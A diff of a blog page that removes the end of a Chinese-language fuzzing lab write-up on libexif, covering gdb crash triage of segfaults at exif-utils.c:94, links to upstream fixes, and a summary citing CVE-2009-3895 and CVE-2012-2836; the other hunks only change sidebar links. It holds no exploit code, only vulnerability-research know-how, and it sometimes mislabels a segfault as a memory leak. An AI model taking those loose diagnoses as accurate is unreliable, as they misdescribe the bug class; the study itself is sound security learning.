-<h5 id="6、动态调试"><a href="#6、动态调试" class="headerlink" title="6、动态调试"></a>6、动态调试</h5><p>编译出带调试信息的可执行文件</p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9615bc59-6331-4782-9e3e-978bf3170239" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2e6a9d0d-4a1c-45d0-ad8b-1d2fd8236f38" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/b71abd7e-80d5-4908-b4b9-06d0273d1b51" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/96c5f039-dc94-41e5-93c9-f2ef5d802ff2" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/bb07280f-84e4-40a3-86da-81b1ae37c7ac" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/2cd7f21f-dcfa-4b47-9ddc-4a87efbb794a" alt="image"></p>
-<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8c87e2c4-8d92-4f0a-ab71-e744d772344e" alt="image"></p>
-<p><img src="C:\Users\15646\AppData\Roaming\Typora\typora-user-images\image-20230728003925454.png" alt="image-20230728003925454"></p>
-<p>放到gdb中，跑出clash</p>
-<h6 id="clash1"><a href="#clash1" class="headerlink" title="clash1"></a>clash1</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d21d484c-3feb-4091-8cb7-a33113e8449c" alt="image"></p>
-<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄漏</p>
-<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94 94 return ((buf[1] &lt;&lt; 8) | buf[0]);</strong></p>
-<p>注意这里的报错，内存地址无法访问，再看地址，猜测为堆缓冲区溢出</p>
-<h6 id="clash2"><a href="#clash2" class="headerlink" title="clash2"></a>clash2</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c527947c-bf6e-409e-9fcb-4dbd094d6396" alt="image"></p>
-<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄露</p>
-<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94</strong></p>
-<h6 id="clash3"><a href="#clash3" class="headerlink" title="clash3"></a>clash3</h6><p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/084afe63-c7a2-486b-9e8e-d5509d4efe19" alt="image"></p>
-<p>报错信息**Program received signal SIGSEGV, Segmentation fault.**存在内存泄露</p>
-<p>报错位置<strong>in exif_data_load_data (data&#x3D;0x4538c0, d_orig&#x3D;<optimized out>, ds_orig&#x3D;<optimized out>) at exif-utils.c:94</strong></p>
-<h5 id="7、漏洞修复"><a href="#7、漏洞修复" class="headerlink" title="7、漏洞修复"></a>7、漏洞修复</h5><p><a target="_blank" rel="noopener" href="https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361">https://github.com/libexif/libexif/commit/8ce72b7f81e61ef69b7ad5bdfeff1516c90fa361</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06">https://github.com/libexif/libexif/commit/00986f6fa979fe810b46e376a462c581f9746e06</a></p>
-<h4 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h4><p>通过这个实验，我了解了<strong>CVE-2009-3895</strong>漏洞和<strong>CVE-2012-2836</strong>漏洞，学习了<strong>libexif</strong>，找到一个使用libexif库的接口应用程序，创建一个出口样本的种子语料库使，用afl-clang-lto编译libexif和选择的应用程序，模糊libexif，直到有一些独特的崩溃，分类崩溃以找到每个漏洞的PoC</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/07/27/Exercise%202%20-%20libexif/" data-id="clklekotu0000m8vf1b0j8wpb" data-title="Exercise 2 - libexif" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1338,7 +1338,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/CTF/" style="font-size: 13.33px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 16.67px;">论文细读</a>
+      <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 15px;">论文细读</a>
     </div>
   </div>
 
@@ -1360,6 +1360,10 @@
       <ul>
         
           <li>
+            <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
+          </li>
+        
+          <li>
             <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
           </li>
         
@@ -1373,10 +1377,6 @@
         
           <li>
             <a href="/2023/08/07/Buuctf%20Web%EF%BC%881-8%EF%BC%89/">Buuctf Web（1-8）</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/03/%E3%80%8AHow%20(and%20How%20Not)%20to%20Write%20a%20Good%20Design%20Paper%E3%80%8B/">《How (and How Not) to Write a Good Design Paper》</a>
           </li>
         
       </ul>
